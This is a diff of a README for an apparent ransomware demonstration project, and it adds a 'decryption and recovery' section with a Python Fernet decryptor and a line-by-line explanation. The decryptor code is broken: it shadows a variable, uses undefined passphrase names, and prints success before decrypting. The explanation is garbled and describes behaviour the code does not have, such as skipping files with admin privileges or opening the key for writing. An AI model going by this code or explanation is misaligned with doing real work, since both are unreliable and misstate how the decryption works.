@@ -234,15 +234,36 @@ https://user-images.githubusercontent.com/96830808/205639185-f08d8817-1551-45ba-
 https://user-images.githubusercontent.com/96830808/205476537-2ed8a910-90c0-4e65-bb07-3a758b7fb36e.mp4
 
 
-
-
-
-
-
 - **STEP 3:**
     ## DECRYPTION AND RECOVERY
+    The decryptor's behavior is completely analogous to ransomware. Naturally, this decryptor is associated with the above mentioned ransomware. The code starts by creating a variable called key.
+ The code then creates an infinite loop that will continue until the file is not empty.
+ In this loop, the code gets the next item in the list and prints out what it does to decrypt it.
+ The first thing that happens is that q.not_empty is set to true which means there are items left in the list so we can keep going through them one at a time.
+ Next, file = q.get() gets us our next item from the list and prints out what it does with f'Decrypting {file}'.
+ Then print(f'{file} SUCCESSFULLY DECRYPTED') tells us that we successfully decrypted something from this particular file into another string of text called contents_decrypted which has been encrypted using Fernet encryption algorithm (which you should know).
+ This new string of text was then written back into our original file as contents_decrypted= Fernet(secretkey).decrypt(contents) .
+ Finally, open('thekey.key', 'rb') as key: opens up our secret key for reading purposes while with open('thekey.key', 'wb') as key: opens up our secret key for writing purposes. 
+ The except clause skips any files with admin priviledges because they are skipped before anything else happens
     ```
-    
+    def decrypt(key):
+    while q.not_empty:
+        file = q.get()
+        print(f'Decrypting {file}') 
+        print(f'{file} SUCCESSFULLY DECRYPTED')
+        try:
+            with open('thekey.key', 'rb') as key:
+                secretkey = key.read()
+            if user_phrase == secret_phrase:    
+                for file in file_paths:
+                    with open(file, 'rb') as thefile:
+                        contents = thefile.read()
+                    contents_decrypted = Fernet(secretkey).decrypt(contents)
+                    with open(file, 'wb') as thefile:
+                        thefile.write(contents_decrypted)
+        except: # files with admin priviledges are skipped
+            print('DECRYPTION FAILED')
+        q.task_done()
     ```
 
 
